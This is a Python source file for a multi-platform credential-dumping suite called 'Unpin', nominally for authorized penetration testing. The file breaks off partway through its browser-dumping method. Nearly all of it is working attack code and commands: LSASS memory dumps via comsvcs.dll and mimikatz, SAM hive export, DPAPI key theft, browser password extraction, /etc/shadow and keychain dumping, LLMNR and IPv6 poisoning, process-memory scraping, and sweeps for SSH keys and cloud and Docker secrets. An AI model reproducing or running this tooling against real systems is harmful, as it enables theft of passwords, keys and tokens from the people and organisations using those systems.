#!/usr/bin/env python3
"""
Unpin - Universal Credential Dumping Suite
For authorized penetration testing only.
Multi-technique credential extraction from Windows, Linux, and macOS systems.
"""

import os
import sys
import re
import json
import base64
import hashlib
import sqlite3
import shutil
import tempfile
import subprocess
import struct
import binascii
from pathlib import Path
from datetime import datetime, timedelta
from collections import defaultdict

# ============================================================
# TECHNIQUE 1: LSASS Memory Dumping (Windows)
# ============================================================

class LSASSDumper:
    """Dump credentials from LSASS process memory on Windows."""
    
    @staticmethod
    def comsvcs_dump(output_path="lsass.dmp"):
        """Use comsvcs.dll MiniDump via Task Manager (no mimikatz)."""
        ps_script = f'''
        $process = Get-Process lsass
        $pid = $process.Id
        $dumpFile = "{output_path}"
        $comsvcs = [System.Runtime.InteropServices.Marshal]::GetModuleHandle("comsvcs.dll")
        if ($comsvcs -eq 0) {{
            [System.Reflection.Assembly]::LoadWithPartialName("System.EnterpriseServices")
            $comsvcs = [System.Runtime.InteropServices.Marshal]::GetModuleHandle("comsvcs.dll")
        }}
        $miniDump = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            [System.Runtime.InteropServices.Marshal]::GetProcAddress($comsvcs, "MiniDumpW"),
            [Func[IntPtr, UInt32, IntPtr, Int32]]
        )
        $fileStream = [System.IO.File]::Open($dumpFile, [System.IO.FileMode]::Create)
        $safeWaitHandle = New-Object System.Runtime.InteropServices.SafeHandle -ArgumentList $process.Handle, $false
        $miniDump.Invoke($process.Handle, $pid, $fileStream.SafeFileHandle.DangerousGetHandle(), 2)
        $fileStream.Close()
        Write-Host "LSASS dumped to $dumpFile"
        '''
        return ps_script
    
    @staticmethod
    def procdump_technique():
        """Use ProcDump from Sysinternals for LSASS dump."""
        return "procdump.exe -ma lsass.exe lsass.dmp"
    
    @staticmethod
    def sql_dumper():
        """Use SQLDumper (comes with SQL Server) for LSASS."""
        return "sqldumper.exe {pid} 0 0x01100".format(pid="{lsass_pid}")
    
    @staticmethod
    def get_lsass_pid():
        """Get LSASS process ID."""
        try:
            result = subprocess.run(
                ['tasklist', '/fi', 'imagename eq lsass.exe', '/fo', 'csv', '/nh'],
                capture_output=True, text=True
            )
            match = re.search(r'"lsass\.exe","(\d+)"', result.stdout)
            if match:
                return int(match.group(1))
        except:
            pass
        return None


# ============================================================
# TECHNIQUE 2: SAM Registry Hive Extraction
# ============================================================

class SAMDumper:
    """Extract and parse SAM registry hive for local credentials."""
    
    @staticmethod
    def save_hives(output_dir="sam_dumps"):
        """Save SAM, SYSTEM, SECURITY hives via registry."""
        os.makedirs(output_dir, exist_ok=True)
        cmds = [
            f'reg save HKLM\\SAM {output_dir}\\SAM',
            f'reg save HKLM\\SYSTEM {output_dir}\\SYSTEM',
            f'reg save HKLM\\SECURITY {output_dir}\\SECURITY',
        ]
        return cmds
    
    @staticmethod
    def parse_sam(sam_path, system_path):
        """Parse SAM hive with SYSTEM boot key to extract NTLM hashes."""
        # This requires the boot key from SYSTEM hive
        # Structure: SAM\SAM\Domains\Account\Users\×××××××R\V
        print(f"[*] Parsing SAM: {sam_path}")
        print(f"[*] Using SYSTEM: {system_path}")
        print("[*] Requires pypykatz or samdump2 for full parsing")
        
        # With pypykatz installed:
        return f"pypykatz registry --sam {sam_path} --system {system_path}"
    
    @staticmethod
    def parse_with_samdump2(sam_path, system_path):
        """Use samdump2 tool."""
        return f"samdump2 {system_path} {sam_path}"


# ============================================================
# TECHNIQUE 3: Windows Credential Manager
# ============================================================

class CredentialManagerDumper:
    """Dump Windows Credential Manager vault."""
    
    @staticmethod
    def cmdkey_list():
        """List stored credentials."""
        return "cmdkey /list"
    
    @staticmethod
    def vaultcmd_enum():
        """Enumerate Windows Vault."""
        return "vaultcmd /listcreds:\"Windows Credentials\" /all"
    
    @staticmethod
    def powershell_vault():
        """Use PowerShell to access vault."""
        ps_script = '''
        Add-Type -AssemblyName System.Security
        $vault = [System.Security.Cryptography.ProtectedData]::Protect(
            [System.Text.Encoding]::UTF8.GetBytes("test"),
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        # List credential manager entries
        $credManager = [System.Runtime.InteropServices.Marshal]::GetTypeFromCLSID([Guid]::new("AEEC4F6E-0F1F-4B51-AE5A-37AF1DBE7E5F"))
        $credObject = [System.Activator]::CreateInstance($credManager)
        $creds = $credObject.EnumerateCredentials()
        
        foreach ($cred in $creds) {
            Write-Host "Target: $($cred.TargetName)"
            Write-Host "User: $($cred.UserName)"
            Write-Host "Password: $($cred.CredentialBlob)"
            Write-Host "---"
        }
        '''
        return ps_script
    
    @staticmethod
    def mimikatz_credman():
        """Use mimikatz to dump Credential Manager."""
        return "mimikatz privilege::debug sekurlsa::credman exit"


# ============================================================
# TECHNIQUE 4: Browser Credential Extraction
# ============================================================

class BrowserCredentialDumper:
    """Extract saved passwords from major browsers."""
    
    CHROME_PATH = os.path.expanduser("~/.config/google-chrome") if sys.platform != 'win32' else \
                  os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
    
    FIREFOX_PATH = os.path.expanduser("~/.mozilla/firefox") if sys.platform != 'win32' else \
                   os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    
    EDGE_PATH = os.path.expanduser("~/.config/microsoft-edge") if sys.platform != 'win32' else \
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")
    
    @staticmethod
    def chrome_extract(output_file="chrome_creds.txt"):
        """Extract Chrome saved passwords."""
        import platform
        
        # Find Chrome login data database
        if platform.system() == "Windows":
            login_db = os.path.expanduser(
                "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            )
            local_state = os.path.expanduser(
                "~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
            )
        elif platform.system() == "Darwin":
            login_db = os.path.expanduser(
                "~/Library/Application Support/Google/Chrome/Default/Login Data"
            )
            local_state = os.path.expanduser(
                "~/Library/Application Support/Google/Chrome/Local State"
            )
        else:  # Linux
            login_db = os.path.expanduser(
                "~/.config/google-chrome/Default/Login Data"
            )
            local_state = os.path.expanduser(
                "~/.config/google-chrome/Local State"
            )
        
        script = f'''
import os
import json
import sqlite3
import shutil
import tempfile
from pathlib import Path

# Copy Login Data to avoid lock issues
login_db = r"{login_db}"
local_state = r"{local_state}"

if not os.path.exists(login_db):
    print("[-] Chrome Login Data not found")
    exit(1)

# Read encryption key
with open(local_state, 'r') as f:
    state = json.load(f)
    encrypted_key = state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key)
    # Remove 'DPAPI' prefix
    encrypted_key = encrypted_key[5:]

# Copy database
tmp_dir = tempfile.mkdtemp()
tmp_db = os.path.join(tmp_dir, "Login Data")
shutil.copy2(login_db, tmp_db)

# Connect and extract
conn = sqlite3.connect(tmp_db)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

results = []
for url, username, encrypted_password in cursor.fetchall():
    if url and username:
        results.append({{
            "url": url,
            "username": username,
            "password": "[encrypted - needs DPAPI/AES decryption]",
            "encrypted_password": encrypted_password.hex()
        }})

conn.close()
shutil.rmtree(tmp_dir, ignore_errors=True)

# Output
with open(r"{output_file}", 'w') as f:
    for r in results:
        f.write(f"URL: {{r['url']}}\\n")
        f.write(f"Username: {{r['username']}}\\n")
        f.write(f"Password (encrypted): {{r['password']}}\\n")
        f.write(f"Encrypted hex: {{r['encrypted_password']}}\\n")
        f.write("-" * 50 + "\\n")

print(f"[+] Extracted {{len(results)}} credentials to {output_file}")
print("[*] Passwords are AES-GCM encrypted with Chrome's master key")
print("[*] Use 'dpapilc' or 'chrome_decrypt' for full decryption")
'''
        return script
    
    @staticmethod
    def firefox_extract(output_file="firefox_creds.txt"):
        """Extract Firefox saved passwords."""
        script = '''
import os
import json
import sqlite3
import shutil
import tempfile
from pathlib import Path

profiles_path = r"{firefox_path}"
output_file = r"{output_file}"

# Find default profile
profiles_ini = os.path.join(profiles_path, "profiles.ini")
if not os.path.exists(profiles_ini):
    print("[-] Firefox profiles.ini not found")
    exit(1)

# Parse profiles.ini
import configparser
config = configparser.ConfigParser()
config.read(profiles_ini)

default_profile = None
for section in config.sections():
    if config.has_option(section, 'Default') and config.get(section, 'Default') == '1':
        default_profile = config.get(section, 'Path')
        break
    if config.has_option(section, 'Path') and 'default' in config.get(section, 'Path').lower():
        default_profile = config.get(section, 'Path')

if not default_profile:
    print("[-] No default Firefox profile found")
    exit(1)

profile_path = os.path.join(profiles_path, default_profile)
logins_db = os.path.join(profile_path, "logins.json")

if not os.path.exists(logins_db):
    print("[-] logins.json not found (Firefox may use signons.sqlite)")
    logins_old = os.path.join(profile_path, "signons.sqlite")
    if os.path.exists(logins_old):
        print("[*] Found legacy signons.sqlite")
        logins_db = logins_old
    else:
        exit(1)

# Parse logins.json (Firefox 60+)
try:
    with open(logins_db, 'r', encoding='utf-8') as f:
        data = json.load(f)
    
    with open(output_file, 'w') as out:
        for entry in data.get('logins', []):
            hostname = entry.get('hostname', '')
            username_field = entry.get('usernameField', '')
            password_field = entry.get('passwordField', '')
            encrypted_username = entry.get('encryptedUsername', '')
            encrypted_password = entry.get('encryptedPassword', '')
            
            out.write(f"Hostname: {{hostname}}\\n")
            out.write(f"Username field: {{username_field}}\\n")
            out.write(f"Password field: {{password_field}}\\n")
            out.write(f"Encrypted username (base64): {{encrypted_username}}\\n")
            out.write(f"Encrypted password (base64): {{encrypted_password}}\\n")
            out.write("-" * 50 + "\\n")
    
    print(f"[+] Extracted {{len(data.get('logins', []))}} credentials to {output_file}")
    print("[*] Passwords are encrypted with Firefox's master key")
    print("[*] Use firefox_decrypt tool for full decryption")
    
except Exception as e:
    print(f"[-] Error: {{e}}")
'''.format(firefox_path=BrowserCredentialDumper.FIREFOX_PATH, output_file=output_file)
        return script


# ============================================================
# TECHNIQUE 4: Linux /etc/shadow and /etc/passwd
# ============================================================

class LinuxCredDumper:
    """Extract Linux credential hashes."""
    
    @staticmethod
    def dump_shadow(output_dir="linux_creds"):
        """Dump shadow file (requires root)."""
        os.makedirs(output_dir, exist_ok=True)
        
        cmds = [
            f"cp /etc/shadow {output_dir}/shadow",
            f"cp /etc/passwd {output_dir}/passwd",
            f"cp /etc/gshadow {output_dir}/gshadow" if os.path.exists('/etc/gshadow') else "",
            "cat /etc/shadow",
        ]
        
        # Also try to get from running processes
        cmds.extend([
            "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i 'pass\\|secret\\|cred\\|token'",
            "find / -name '*.kdbx' -o -name '*.kdb' 2>/dev/null",
        ])
        
        return [c for c in cmds if c]
    
    @staticmethod
    def parse_shadow(shadow_file):
        """Parse shadow file into structured data."""
        users = []
        if not os.path.exists(shadow_file):
            return users
        
        with open(shadow_file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split(':')
                if len(parts) >= 2:
                    user = {
                        'username': parts[0],
                        'hash': parts[1],
                        'last_change': parts[2] if len(parts) > 2 else '',
                        'min_days': parts[3] if len(parts) > 3 else '',
                        'max_days': parts[4] if len(parts) > 4 else '',
                    }
                    
                    # Determine hash type
                    if user['hash'].startswith('$6$'):
                        user['hash_type'] = 'SHA-512 (Linux shadow)'
                    elif user['hash'].startswith('$5$'):
                        user['hash_type'] = 'SHA-256 (Linux shadow)'
                    elif user['hash'].startswith('$y$'):
                        user['hash_type'] = 'yescrypt'
                    elif user['hash'].startswith('$2y$') or user['hash'].startswith('$2a$') or user['hash'].startswith('$2b$'):
                        user['hash_type'] = 'bcrypt'
                    elif user['hash'] == '*' or user['hash'] == '!':
                        user['hash_type'] = 'Locked/Disabled'
                    else:
                        user['hash_type'] = 'Unknown/Other'
                    
                    users.append(user)
        
        return users
    
    @staticmethod
    def unshadow(passwd_file, shadow_file, output="unshadowed.txt"):
        """Combine passwd and shadow for cracking."""
        cmd = f"unshadow {passwd_file} {shadow_file} > {output}"
        return cmd


# ============================================================
# TECHNIQUE 5: macOS Keychain Dumping
# ============================================================

class MacKeychainDumper:
    """Extract credentials from macOS Keychain."""
    
    @staticmethod
    def security_list(output_file="keychain_creds.txt"):
        """Use security command-line tool."""
        cmds = [
            # List all keychains
            "security list-keychains",
            
            # Dump login keychain (requires user password)
            f"security dump-keychain -d login.keychain > {output_file} 2>/dev/null || echo '[-] Requires user interaction for keychain password'",
            
            # List all Internet passwords
            f"security find-internet-password -a '*' -g 2>&1 | grep -E 'acct|password' > {output_file}.internet",
            
            # List all generic passwords
            f"security find-generic-password -a '*' -g 2>&1 | grep -E 'acct|password' > {output_file}.generic",
            
            # Dump Safari saved passwords
            "security dump-keychain /Users/*/Library/Keychains/login.keychain-db 2>/dev/null | grep -A 2 'password'",
        ]
        return cmds
    
    @staticmethod
    def safari_password_extract():
        """Extract Safari saved passwords."""
        ps_script = '''
#!/bin/bash
# Safari passwords stored in keychain under "Safari" application
security dump-keychain -a "/Users/$(whoami)/Library/Keychains/login.keychain-db" 2>/dev/null | \
    grep -B 5 -A 2 "Safari" | tee safari_keychain_entries.txt

# Also check Desktop/Keychains for iCloud synced passwords
security dump-keychain "/Users/$(whoami)/Library/Keychains/icloud.keychain" 2>/dev/null | \
    grep -E "password|acct" | tee icloud_keychain.txt
'''
        return ps_script
    
    @staticmethod
    def chainbreaker_automation(output_dir="keychain_dumps"):
        """Use chainbreaker tool for offline keychain parsing."""
        cmds = [
            # Copy keychain file
            f"cp ~/Library/Keychains/login.keychain-db {output_dir}/",
            # Extract with chainbreaker
            f"chainbreaker -i {output_dir}/login.keychain-db -o {output_dir}/creds.json",
        ]
        return cmds


# ============================================================
# TECHNIQUE 6: Network Credential Capture
# ============================================================

class NetworkCredCapture:
    """Capture credentials from network traffic."""
    
    @staticmethod
    def tcpdump_http_auth(interface="eth0", output="http_auth.pcap"):
        """Capture HTTP Basic/Digest auth."""
        return f"tcpdump -i {interface} -A -s 0 -w {output} 'tcp port 80 or tcp port 8080' 2>/dev/null &"
    
    @staticmethod
    def tcpdump_ntlm(interface="eth0", output="ntlm_auth.pcap"):
        """Capture NTLM authentication."""
        return f"tcpdump -i {interface} -s 0 -w {output} 'port 445 or port 139'"
    
    @staticmethod
    def responder_listener():
        """Start Responder for LLMNR/NBT-NS poisoning."""
        return "responder -I eth0 -w -r -f -v"
    
    @staticmethod
    def mitm6_dns():
        """IPv6 DNS poisoning for credential capture."""
        return "mitm6 -d domain.local -i eth0"
    
    @staticmethod
    def extract_http_auth(pcap_file):
        """Extract HTTP auth headers from pcap."""
        cmd = f"tshark -r {pcap_file} -Y 'http.authbasic or http.authdigest' -T fields -e http.host -e http.authbasic -e http.authdigest"
        return cmd


# ============================================================
# TECHNIQUE 7: Memory Scraping (all platforms)
# ============================================================

class MemoryScraper:
    """Scan process memory for credentials."""
    
    @staticmethod
    def linux_proc_mem_scan(target_pid=None, output_file="memory_creds.txt"):
        """Scan /proc/<pid>/mem for credential patterns."""
        script = f'''
import os
import re

output = r"{output_file}"
patterns = [
    rb"password[\\s:=]+([^\\s]+)",
    rb"passwd[\\s:=]+([^\\s]+)",
    rb"secret[\\s:=]+([^\\s]+)",
    rb"token[\\s:=]+([^\\s]+)",
    rb"credential[\\s:=]+([^\\s]+)",
    rb"api[_-]?key[\\s:=]+([^\\s]+)",
    rb"auth[\\s:=]+([^\\s]+)",
    rb"bearer[\\s:=]+([^\\s]+)",
]

targets = [{target_pid}] if {target_pid} else None

if not targets:
    import glob
    targets = []
    for p in glob.glob('/proc/*/cmdline'):
        try:
            with open(p, 'rb') as f:
                data = f.read()
                if b'cred' in data.lower() or b'pass' in data.lower() or b'auth' in data.lower():
                    pid = p.split('/')[2]
                    targets.append(pid)
        except:
            pass

results = []
for pid in targets[:20]:  # Limit to first 20
    try:
        maps_path = f'/proc/{{pid}}/maps'
        mem_path = f'/proc/{{pid}}/mem'
        
        with open(maps_path, 'r') as f:
            maps = f.readlines()
        
        for line in maps:
            if 'rw-p' not in line:
                continue
            
            parts = line.split()
            addr_range = parts[0]
            start, end = addr_range.split('-')
            start = int(start, 16)
            end = int(end, 16)
            
            try:
                with open(mem_path, 'rb') as mem:
                    mem.seek(start)
                    data = mem.read(end - start)
                    
                    for pattern in patterns:
                        for match in re.finditer(pattern, data, re.IGNORECASE):
                            value = match.group(1).decode('utf-8', errors='ignore')
                            results.append({{
                                'pid': pid,
                                'pattern': pattern.decode(),
                                'value': value[:100]  # Truncate long values
                            }})
            except:
                pass
    except:
        pass

with open(output, 'w') as f:
    for r in results:
        f.write(f"PID: {{r['pid']}} | Pattern: {{r['pattern']}} | Value: {{r['value']}}\\n")

print(f"[+] Found {{len(results)}} potential credentials in {{output}}")
'''
        return script


# ============================================================
# TECHNIQUE 8: Configuration File Scanner
# ============================================================

class ConfigFileScanner:
    """Scan filesystem for credential-containing config files."""
    
    COMMON_PATHS = {
        'windows': [
            'C:\\inetpub\\wwwroot\\web.config',
            'C:\\Windows\\Microsoft.NET\\Framework\\*\\config\\web.config',
            '%USERPROFILE%\\.aws\\credentials',
            '%USERPROFILE%\\.ssh\\id_rsa',
            '%USERPROFILE%\\.gitconfig',
            '%APPDATA%\\npmrc',
            '%APPDATA%\\gcloud\\credentials.db',
        ],
        'linux': [
            '/etc/apache2/.htpasswd',
            '/etc/nginx/.htpasswd',
            '/var/www/html/.env',
            '/var/www/html/config.php',
            '~/.aws/credentials',
            '~/.ssh/id_rsa',
            '~/.git-credentials',
            '~/.config/gcloud/credentials.db',
            '/etc/mysql/my.cnf',
            '/etc/postgresql/*/main/pg_hba.conf',
            '~/.npmrc',
        ],
        'darwin': [
            '~/.aws/credentials',
            '~/.ssh/id_rsa',
            '~/.git-credentials',
            '~/.config/gcloud/credentials.db',
            '/etc/apache2/.htpasswd',
            '/Library/Server/Web/Config/php/config.php',
        ]
    }
    
    PATTERNS = [
        r'(?i)password\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'(?i)passwd\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'(?i)pwd\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'(?i)secret\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'(?i)api[_-]?key\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'(?i)token\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'(?i)db_password\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'(?i)DB_PASSWORD\s*[=:]\s*["\']?([^\s"\'&;]+)',
        r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
    ]
    
    @staticmethod
    def scanner(output_file="config_creds.txt"):
        """Scan common config file paths for credentials."""
        import platform
        system = platform.system().lower()
        
        if system == 'windows':
            paths = ConfigFileScanner.COMMON_PATHS['windows']
        elif system == 'darwin':
            paths = ConfigFileScanner.COMMON_PATHS['darwin']
        else:
            paths = ConfigFileScanner.COMMON_PATHS['linux']
        
        scan_script = f'''
import os
import re

output = r"{output_file}"
patterns = {ConfigFileScanner.PATTERNS}
paths = {paths}

results = []
for path_pattern in paths:
    expanded = os.path.expanduser(path_pattern)
    # Handle wildcards
    if '*' in expanded:
        import glob
        files = glob.glob(expanded)
    else:
        files = [expanded] if os.path.exists(expanded) else []
    
    for filepath in files:
        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read()
            
            for pattern in patterns:
                matches = re.finditer(pattern, content)
                for match in matches:
                    line_num = content[:match.start()].count('\\n') + 1
                    matched_text = match.group(0)[:100]
                    results.append({{
                        'file': filepath,
                        'line': line_num,
                        'match': matched_text
                    }})
        except Exception as e:
            pass

with open(output, 'w') as f:
    for r in results:
        f.write(f"File: {{r['file']}} (line {{r['line']}})\\n")
        f.write(f"Match: {{r['match']}}\\n")
        f.write("-" * 60 + "\\n")

print(f"[+] Found {{len(results)}} credential patterns in {{output}}")
if results:
    for r in results[:10]:
        print(f"    {{r['file']}}:{{r['line']}} -> {{r['match'][:60]}}")
'''
        return scan_script


# ============================================================
# TECHNIQUE 9: SSH Key Discovery
# ============================================================

class SSHKeyDiscovery:
    """Discover and extract SSH private keys and known hosts."""
    
    @staticmethod
    def discover_keys(output_dir="ssh_keys"):
        """Find all SSH keys on the system."""
        os.makedirs(output_dir, exist_ok=True)
        
        cmds = [
            # Standard locations
            f"find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_xmss' 2>/dev/null | tee {output_dir}/key_locations.txt",
            
            # Copy keys
            f"find / -name 'id_rsa' -exec cp --parents {{}} {output_dir}/ \\; 2>/dev/null",
            
            # Known hosts
            f"find / -name 'known_hosts' 2>/dev/null | tee {output_dir}/known_hosts_locations.txt",
            
            # SSH config
            f"find / -name 'config' -path '*/.ssh/*' 2>/dev/null | tee {output_dir}/ssh_configs.txt",
            
            # authorized_keys (who can access)
            f"find / -name 'authorized_keys' 2>/dev/null | tee {output_dir}/authorized_keys_locations.txt",
            
            # Agent forwarding sockets
            "find /tmp -name 'agent.*' 2>/dev/null",
            "ls -la $SSH_AUTH_SOCK 2>/dev/null",
        ]
        return cmds


# ============================================================
# TECHNIQUE 10: Cloud Provider Credentials
# ============================================================

class CloudCredScanner:
    """Discover cloud provider credentials on the system."""
    
    @staticmethod
    def scan_cloud_creds(output_file="cloud_creds.txt"):
        """Scan for AWS, GCP, Azure credentials."""
        script = f'''
import os
import json
from pathlib import Path

output = r"{output_file}"
results = []

# AWS
aws_cred_paths = [
    os.path.expanduser("~/.aws/credentials"),
    os.path.expanduser("~/.aws/config"),
]
for p in aws_cred_paths:
    if os.path.exists(p):
        with open(p) as f:
            content = f.read()
        results.append(("AWS", p, content))

# AWS SSO cache
aws_sso_cache = os.path.expanduser("~/.aws/sso/cache")
if os.path.exists(aws_sso_cache):
    for f in os.listdir(aws_sso_cache):
        fpath = os.path.join(aws_sso_cache, f)
        if f.endswith('.json'):
            with open(fpath) as fh:
                try:
                    data = json.load(fh)
                    if 'accessToken' in data or 'clientSecret' in data:
                        results.append(("AWS SSO", fpath, json.dumps(data, indent=2)))
                except:
                    pass

# GCP
gcp_cred_paths = [
    os.path.expanduser("~/.config/gcloud/credentials.db"),
    os.path.expanduser("~/.config/gcloud/application_default_credentials.json"),
    os.path.expanduser("~/.config/gcloud/legacy_credentials"),
]
for p in gcp_cred_paths:
    if os.path.exists(p):
        try:
            if p.endswith('.json'):
                with open(p) as f:
                    content = json.load(f)
                    if 'client_email' in content or 'private_key' in content:
                        results.append(("GCP", p, json.dumps(content, indent=2)[:500]))
            else:
                results.append(("GCP", p, "[binary file]"))
        except:
            results.append(("GCP", p, "[file exists]"))

# Azure
azure_cred_paths = [
    os.path.expanduser("~/.azure/accessTokens.json"),
    os.path.expanduser("~/.azure/azureProfile.json"),
    os.path.expanduser("~/.azure/msal_token_cache.json"),
]
for p in azure_cred_paths:
    if os.path.exists(p):
        try:
            with open(p) as f:
                content = f.read()[:500]
            results.append(("Azure", p, content))
        except:
            results.append(("Azure", p, "[file exists]"))

# Write output
with open(output, 'w') as f:
    for provider, path, content in results:
        f.write(f"Provider: {{provider}}\\n")
        f.write(f"Path: {{path}}\\n")
        f.write(f"Content:\\n{{content}}\\n")
        f.write("=" * 60 + "\\n\\n")

print(f"[+] Found {{len(results)}} cloud credential files in {{output}}")
for provider, path, _ in results:
    print(f"    [{{provider}}] {{path}}")
'''
        return script


# ============================================================
# TECHNIQUE 11: Windows DPAPI Master Key Extraction
# ============================================================

class DPAPIDumper:
    """Extract DPAPI master keys for credential decryption."""
    
    @staticmethod
    def dump_master_keys(output_dir="dpapi_keys"):
        """Dump DPAPI master keys."""
        os.makedirs(output_dir, exist_ok=True)
        
        cmds = [
            # List master key files
            f"dir /s /b %APPDATA%\\Microsoft\\Protect > {output_dir}\\master_key_paths.txt",
            
            # Copy master keys
            f"xcopy /E /I %APPDATA%\\Microsoft\\Protect {output_dir}\\Protect",
            
            # Also get system master keys
            f"dir /s /b %WINDIR%\\System32\\Microsoft\\Protect > {output_dir}\\system_master_key_paths.txt 2>nul",
        ]
        return cmds
    
    @staticmethod
    def dpapi_mimikatz():
        """Use mimikatz to extract DPAPI."""
        return "mimikatz privilege::debug dpapi::masterkey /in:%APPDATA%\\Microsoft\\Protect\\* /rpc exit"


# ============================================================
# TECHNIQUE 12: Docker Container Credentials
# ============================================================

class DockerCredScanner:
    """Scan Docker containers for credentials."""
    
    @staticmethod
    def scan_docker(output_file="docker_creds.txt"):
        """Scan Docker containers, images, and volumes for credentials."""
        cmds = [
            # List running containers
            "docker ps --format '{{.Names}} {{.Image}} {{.Status}}'",
            
            # Inspect containers for environment variables
            "for c in $(docker ps -q); do echo \"=== Container: $(docker inspect --format '{{.Name}}' $c) ===\"; docker exec $c env 2>/dev/null | grep -iE 'pass|secret|token|key|cred'; done",
            
            # Check Docker config files
            "cat ~/.docker/config.json 2>/dev/null",
            
            # Check Docker compose files
            "find / -name 'docker-compose*.yml' -o -name 'docker-compose*.yaml' 2>/dev/null",
            
            # Docker swarm secrets
            "docker secret ls 2>/dev/null",
            
            # Check all running containers for common cred patterns
            "for c in $(docker ps -q); do docker exec $c bash -c 'grep -r -l -i \"password\\|secret\\|api_key\\|token\" /etc/ /var/ /opt/ 2>/dev/null' 2>/dev/null; done",
        ]
        return cmds


# ============================================================
# MAIN ORCHESTRATOR
# ============================================================

class CredentialDumper:
    """Master orchestrator for all credential dumping techniques."""
    
    def __init__(self, output_dir="credential_dumps"):
        self.output_dir = output_dir
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.session_dir = os.path.join(output_dir, f"session_{self.timestamp}")
        self.results = defaultdict(list)
        self.system = sys.platform
        
        os.makedirs(self.session_dir, exist_ok=True)
        print(f"[*] Credential dump session: {self.session_dir}")
    
    def run_all(self):
        """Run all applicable techniques."""
        print(f"\n{'='*60}")
        print(f"  UNIVERSAL CREDENTIAL DUMPING SUITE")
        print(f"  Target: {self.system.upper()}")
        print(f"  Started: {datetime.now().isoformat()}")
        print(f"{'='*60}\n")
        
        print("[*] WARNING: These techniques access sensitive system memory and files.")
        print("[*] Ensure you have explicit authorization before proceeding.\n")
        
        techniques = []
        
        if self.system.startswith('win'):
            techniques = [
                ("LSASS Memory Dump", self.dump_lsass),
                ("SAM Registry Hive", self.dump_sam),
                ("Credential Manager", self.dump_credman),
                ("Browser Credentials", self.dump_browsers),
                ("DPAPI Master Keys", self.dump_dpapi),
                ("Cloud Credentials", self.dump_cloud),
                ("Config File Scanner", self.dump_configs),
                ("SSH Key Discovery", self.dump_ssh),
                ("Docker Credentials", self.dump_docker),
            ]
        elif self.system.startswith('linux'):
            techniques = [
                ("Shadow File Dump", self.dump_shadow),
                ("Browser Credentials", self.dump_browsers),
                ("Memory Scraping", self.dump_memory),
                ("Config File Scanner", self.dump_configs),
                ("SSH Key Discovery", self.dump_ssh),
                ("Cloud Credentials", self.dump_cloud),
                ("Docker Credentials", self.dump_docker),
                ("Process Environment Scan", self.dump_environ),
            ]
        elif self.system.startswith('darwin'):
            techniques = [
                ("Keychain Dump", self.dump_keychain),
                ("Browser Credentials", self.dump_browsers),
                ("Memory Scraping", self.dump_memory),
                ("Config File Scanner", self.dump_configs),
                ("SSH Key Discovery", self.dump_ssh),
                ("Cloud Credentials", self.dump_cloud),
                ("Docker Credentials", self.dump_docker),
            ]
        
        for name, func in techniques:
            print(f"\n{'─'*50}")
            print(f"[*] TECHNIQUE: {name}")
            print(f"{'─'*50}")
            try:
                func()
            except Exception as e:
                print(f"[-] Error in {name}: {e}")
        
        self.generate_report()
    
    def dump_lsass(self):
        """Technique 1: LSASS dump."""
        dumper = LSASSDumper()
        pid = dumper.get_lsass_pid()
        
        if pid:
            print(f"[*] LSASS PID: {pid}")
            print("[*] Attempting comsvcs.dll MiniDump...")
            
            ps_script = dumper.comsvcs_dump(
                os.path.join(self.session_dir, "lsass.dmp")
            )
            
            ps_path = os.path.join(self.session_dir, "dump_lsass.ps1")
            with open(ps_path, 'w') as f:
                f.write(ps_script)
            
            print(f"[+] PowerShell script saved: {ps_path}")
            print("[*] Run as Administrator:")
            print(f"    powershell -ExecutionPolicy Bypass -File {ps_path}")
            
            # Also suggest alternative methods
            print("\n[*] Alternative methods:")
            print(f"    1. ProcDump: {dumper.procdump_technique()}")
            print(f"    2. SQLDumper: {dumper.sql_dumper().format(lsass_pid=pid)}")
            print(f"    3. Mimikatz: mimikatz privilege::debug sekurlsa::logonpasswords exit")
        else:
            print("[-] Could not find LSASS process")
    
    def dump_sam(self):
        """Technique 2: SAM hive dump."""
        dumper = SAMDumper()
        sam_dir = os.path.join(self.session_dir, "sam_hives")
        cmds = dumper.save_hives(sam_dir)
        
        print("[*] SAM hive dump commands:")
        for cmd in cmds:
            print(f"    {cmd}")
            print(f"    -> Run as Administrator")
        
        print("\n[*] Parse with:")
        print(f"    {dumper.parse_with_samdump2(f'{sam_dir}/SAM', f'{sam_dir}/SYSTEM')}")
        print(f"    {dumper.parse_sam(f'{sam_dir}/SAM', f'{sam_dir}/SYSTEM')}")
    
    def dump_credman(self):
        """Technique 3: Credential Manager."""
        print("[*] Windows Credential Manager extraction:")
        print(f"    1. {CredentialManagerDumper.cmdkey_list()}")
        print(f"    2. {CredentialManagerDumper.vaultcmd_enum()}")
        print(f"    3. {CredentialManagerDumper.mimikatz_credman()}")
        
        ps_script = CredentialManagerDumper.powershell_vault()
        ps_path = os.path.join(self.session_dir, "dump_credman.ps1")
        with open(ps_path, 'w') as f:
            f.write(ps_script)
        print(f"[+] PowerShell script: {ps_path}")
    
    def dump_browsers(self):
        """Technique 4: Browser credentials."""
        browser_dir = os.path.join(self.session_dir, "browsers")
        os.makedirs(browser_dir, exist_ok=True)
        
        # Chrome
